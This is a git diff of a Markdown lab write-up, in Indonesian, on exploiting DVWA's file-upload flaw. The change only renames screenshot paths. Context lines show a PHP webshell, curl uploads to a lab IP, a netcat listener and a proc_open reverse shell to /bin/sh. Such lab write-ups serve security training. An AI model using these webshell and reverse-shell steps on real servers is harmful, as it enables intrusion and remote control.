@@ -42,7 +42,7 @@ if(isset($_GET['cmd'])) {
 SHELL
 ```
 
-![Create Webshell](screenshot/rs2.png)
+![Create Webshell](screenshots/rs2.png)
 
 ```bash
 # Set session cookie
@@ -55,14 +55,14 @@ curl -s "http://192.168.217.130/DVWA/vulnerabilities/upload/" \
   -F "Upload=Upload"
 ```
 
-![Upload Webshell](screenshot/rs3.png)
+![Upload Webshell](screenshots/rs3.png)
 
 ```bash
 # Verifikasi webshell aktif
 curl -s "http://192.168.217.130/DVWA/hackable/uploads/shell.php?cmd=id"
 ```
 
-![Verify Webshell](screenshot/rs4.png)
+![Verify Webshell](screenshots/rs4.png)
 
 ---
 
@@ -76,7 +76,7 @@ Membuka listener netcat di mesin attacker untuk menerima koneksi balik dari serv
 nc -lvnp 4444
 ```
 
-![Setup Listener](screenshot/rs7.png)
+![Setup Listener](screenshots/rs7.png)
 
 ---
 
@@ -93,7 +93,7 @@ $proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);
 REVSHELL
 ```
 
-![Create Reverse Shell](screenshot/rs8.png)
+![Create Reverse Shell](screenshots/rs8.png)
 
 ---
 
@@ -108,7 +108,7 @@ curl -s "http://192.168.217.130/DVWA/vulnerabilities/upload/" \
   -F "Upload=Upload"
 ```
 
-![Upload Reverse Shell](screenshot/rs5.png)
+![Upload Reverse Shell](screenshots/rs5.png)
 
 ---
 
@@ -135,9 +135,9 @@ id
 whoami
 ```
 
-![Shell Received](screenshot/rs9.png)
+![Shell Received](screenshots/rs9.png)
 
-![Multiple Shell Sessions](screenshot/rs13.png)
+![Multiple Shell Sessions](screenshots/rs13.png)
 
 ---
 
